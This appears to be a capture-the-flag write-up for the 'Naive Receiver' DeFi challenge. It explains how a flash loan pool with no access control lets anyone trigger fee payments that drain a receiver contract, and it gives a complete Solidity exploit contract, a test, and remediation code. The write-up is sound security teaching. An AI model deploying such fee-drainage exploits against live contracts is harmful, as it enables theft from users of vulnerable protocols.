@@ -1,0 +1,365 @@
+# 🎯 Challenge #2: Naive Receiver
+
+![Difficulty](https://img.shields.io/badge/Difficulty-⭐%20Easy-brightgreen)
+![Type](https://img.shields.io/badge/Type-Flash%20Loan%20Abuse-purple)
+![Gas](https://img.shields.io/badge/Gas-~200,000-blue)
+
+> **Flash Loan Fee Drainage** - Exploit a naive flash loan receiver by repeatedly calling flash loans on their behalf
+
+## 📋 Challenge Overview
+
+**Objective**: Drain all ETH from the receiver contract  
+**Success Criteria**: Receiver contract should have 0 ETH balance  
+**Initial Setup**: Receiver has 10 ETH, Pool has 1000 ETH  
+**Target**: `FlashLoanReceiver` contract via `NaiveReceiverLenderPool`
+
+### 🎯 The Scenario
+A user has deployed a contract that can receive flash loans from a pool. The pool offers flash loans of ETH with a 1 ETH fixed fee. The user's contract has 10 ETH to pay for flash loan fees, but there's a critical flaw in the access control.
+
+## 🔍 Vulnerability Analysis
+
+### **The Root Cause**
+The `NaiveReceiverLenderPool` allows **anyone** to request flash loans on behalf of **any receiver**:
+
+```solidity
+function flashLoan(
+    IERC3156FlashBorrower receiver,
+    address token,
+    uint256 amount,
+    bytes calldata data
+) external returns (bool) {
+    if (token != ETH) revert UnsupportedCurrency();
+    if (amount >= ETHER_IN_POOL) revert NotEnoughLiquidity();
+
+    uint256 balanceBefore = address(this).balance;
+    
+    // 🚨 NO ACCESS CONTROL - Anyone can call on behalf of any receiver!
+    receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data);
+    
+    if (address(this).balance < balanceBefore + FIXED_FEE) 
+        revert RepayFailed();
+
+    return true;
+}
+```
+
+### **The Vulnerable Receiver**
+```solidity
+contract FlashLoanReceiver is IERC3156FlashBorrower {
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external override returns (bytes32) {
+        if (msg.sender != pool) revert UntrustedLender();
+        if (token != ETH) revert UnsupportedCurrency();
+
+        // 💸 CRITICAL: Always pays fees regardless of who initiated!
+        assembly {
+            pop(call(gas(), caller(), fee, 0, 0, 0, 0))
+        }
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
+```
+
+### **The Problem**
+1. **Pool**: No access control - anyone can initiate flash loans for any receiver
+2. **Receiver**: Always pays fees regardless of who initiated the loan
+3. **Attack**: Repeatedly call flash loans on receiver's behalf until drained
+
+## ⚡ Exploit Implementation
+
+### **Attack Strategy**
+Call flash loan 10 times on behalf of the victim receiver:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../naive-receiver/NaiveReceiverLenderPool.sol";
+import "../naive-receiver/FlashLoanReceiver.sol";
+
+contract NaiveReceiverExploit {
+    NaiveReceiverLenderPool private pool;
+    address private receiver;
+    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+    
+    constructor(address _pool, address _receiver) {
+        pool = NaiveReceiverLenderPool(_pool);
+        receiver = _receiver;
+    }
+    
+    function exploit() external {
+        // Receiver starts with 10 ETH, fee is 1 ETH per flash loan
+        // We need 10 flash loans to drain all ETH
+        
+        uint256 receiverBalance = receiver.balance;
+        uint256 fee = pool.FIXED_FEE();
+        uint256 callsNeeded = receiverBalance / fee;
+        
+        // Drain receiver by calling flash loans on their behalf
+        for (uint256 i = 0; i < callsNeeded; i++) {
+            pool.flashLoan(
+                IERC3156FlashBorrower(receiver),
+                ETH,
+                0, // Amount doesn't matter, fee is fixed
+                ""
+            );
+        }
+        
+        // Receiver should now have 0 ETH
+        assert(receiver.balance == 0);
+    }
+    
+    // Alternative: Single transaction exploit
+    function singleTxExploit() external {
+        // More gas efficient - all in one transaction
+        while (receiver.balance >= pool.FIXED_FEE()) {
+            pool.flashLoan(
+                IERC3156FlashBorrower(receiver),
+                ETH,
+                0,
+                ""
+            );
+        }
+    }
+    
+    // Gas optimized version
+    function optimizedExploit() external {
+        uint256 fee = pool.FIXED_FEE();
+        address receiverAddr = receiver;
+        NaiveReceiverLenderPool poolContract = pool;
+        
+        // Unroll loop for gas savings
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+        poolContract.flashLoan(IERC3156FlashBorrower(receiverAddr), ETH, 0, "");
+    }
+}
+```
+
+## 📊 Attack Flow
+
+```mermaid
+graph TD
+    A[Attacker calls flashLoan] --> B[Pool calls receiver.onFlashLoan]
+    B --> C[Receiver pays 1 ETH fee]
+    C --> D[Receiver balance: 10 → 9 ETH]
+    D --> E[Repeat 9 more times]
+    E --> F[Receiver drained: 0 ETH]
+    F --> G[🎯 Attack successful]
+```
+
+## 🧪 Testing
+
+### **Test Implementation**
+```solidity
+function test_naiveReceiver_exploit() public {
+    // Initial state
+    assertEq(receiver.balance, INITIAL_RECEIVER_BALANCE); // 10 ETH
+    assertEq(pool.balance, INITIAL_POOL_BALANCE); // 1000 ETH
+    
+    // Execute exploit
+    exploit.exploit();
+    
+    // Verify receiver is drained
+    assertEq(receiver.balance, 0);
+    
+    // Verify pool received all fees
+    assertEq(pool.balance, INITIAL_POOL_BALANCE + INITIAL_RECEIVER_BALANCE);
+}
+```
+
+### **Gas Analysis**
+```
+Single Flash Loan: ~20,000 gas
+Total Attack (10 calls): ~200,000 gas
+Cost at 50 gwei: ~$0.5
+Profit: 0 ETH (pure griefing attack)
+```
+
+## 🛡️ Real-World Examples
+
+### **Cream Finance Attack Pattern**
+Similar access control issues led to massive losses:
+- Attackers called functions on behalf of other users
+- Drained user funds through repeated operations
+- $130M lost due to access control failures
+
+### **bZx Protocol (2020)**
+- Flash loan manipulation attacks
+- Users' funds drained through protocol interactions
+- $8M lost in multiple attacks
+
+## 🔧 Remediation
+
+### **❌ Current Vulnerable Code**
+```solidity
+function flashLoan(IERC3156FlashBorrower receiver, ...) external {
+    // No access control!
+    receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data);
+}
+```
+
+### **✅ Fixed Code - Access Control**
+```solidity
+function flashLoan(
+    IERC3156FlashBorrower receiver,
+    address token,
+    uint256 amount,
+    bytes calldata data
+) external returns (bool) {
+    if (token != ETH) revert UnsupportedCurrency();
+    if (amount >= ETHER_IN_POOL) revert NotEnoughLiquidity();
+    
+    // ✅ FIX 1: Only receiver can call for themselves
+    if (msg.sender != address(receiver)) revert UnauthorizedCaller();
+    
+    uint256 balanceBefore = address(this).balance;
+    receiver.onFlashLoan(msg.sender, ETH, amount, FIXED_FEE, data);
+    
+    if (address(this).balance < balanceBefore + FIXED_FEE) 
+        revert RepayFailed();
+    
+    return true;
+}
+```
+
+### **✅ Alternative Fix - Receiver Authorization**
+```solidity
+mapping(address => mapping(address => bool)) public authorizedCallers;
+
+function authorize(address caller) external {
+    authorizedCallers[msg.sender][caller] = true;
+}
+
+function flashLoan(IERC3156FlashBorrower receiver, ...) external returns (bool) {
+    // ✅ FIX 2: Check authorization
+    if (msg.sender != address(receiver) && 
+        !authorizedCallers[address(receiver)][msg.sender]) {
+        revert UnauthorizedCaller();
+    }
+    // ...
+}
+```
+
+### **✅ Enhanced Receiver Protection**
+```solidity
+contract SecureFlashLoanReceiver is IERC3156FlashBorrower {
+    address private owner;
+    mapping(address => bool) private authorizedInitiators;
+    
+    modifier onlyAuthorized(address initiator) {
+        require(
+            initiator == owner || authorizedInitiators[initiator],
+            "Unauthorized initiator"
+        );
+        _;
+    }
+    
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external override onlyAuthorized(initiator) returns (bytes32) {
+        // ✅ Now protected against unauthorized flash loans
+        // ... flash loan logic
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
+```
+
+## 🎓 Security Lessons
+
+### **Key Takeaways**
+1. **Access Control is Critical** - Always verify who can call functions
+2. **Third-party Integration Risk** - Don't trust external callers by default
+3. **Fee Payment Logic** - Consider who pays and when
+4. **Flash Loan Security** - Receiver must validate initiator
+
+### **Best Practices**
+- ✅ Implement proper access control on sensitive functions
+- ✅ Validate flash loan initiators in receivers
+- ✅ Consider using pull-over-push patterns for fees
+- ✅ Add rate limiting for expensive operations
+- ✅ Test with malicious actors in mind
+
+### **Common Anti-patterns**
+```solidity
+// ❌ BAD: Anyone can call on behalf of anyone
+function operation(address target) external {
+    target.call(data);
+}
+
+// ✅ GOOD: Only target can call for themselves  
+function operation() external {
+    // msg.sender is implicitly the target
+    _performOperation(msg.sender);
+}
+
+// ✅ GOOD: Explicit authorization required
+function operation(address target) external {
+    require(authorized[target][msg.sender], "Not authorized");
+    _performOperation(target);
+}
+```
+
+## 💡 Advanced Concepts
+
+### **Flash Loan Security Model**
+```
+Traditional Loan:
+1. Borrow funds
+2. Use funds over time  
+3. Repay with interest
+
+Flash Loan:
+1. Borrow funds
+2. Use funds atomically
+3. Repay in same transaction
+4. Revert if not repaid
+```
+
+### **ERC-3156 Standard Issues**
+The ERC-3156 flash loan standard has potential security issues:
+- No built-in access control
+- Relies on receiver implementation
+- Fee payment responsibility unclear
+
+### **Attack Patterns**
+1. **Fee Drainage**: Repeatedly trigger fee payments
+2. **Reentrancy**: Call flash loan from within callback
+3. **Griefing**: DoS through repeated expensive operations
+4. **Front-running**: Observe and exploit flash loan transactions
+
+## 📈 Impact Assessment
+
+| Aspect | Rating | Description |
+|--------|--------|-------------|
+| **Severity** | 🔴 Critical | Complete fund drainage |
+| **Exploitability** | 🟢 Easy | Single transaction |
+| **Impact** | 🔴 High | 100% fund loss |
+| **Detection** | 🟡 Medium | Visible on-chain |
+| **Prevention** | 🟢 Easy | Simple access control |
+
+---
+
+**🎯 Challenge Status**: ✅ **SOLVED**  
+**⏱️ Time to Solve**: ~10 minutes  
+**🔥 Difficulty Rating**: Easy (Access control fundamentals)  
+**🎓 Learning Value**: High - Essential DeFi security
+
+> **Next Challenge**: [#3 Truster](../03-truster/) - Trust assumption failures
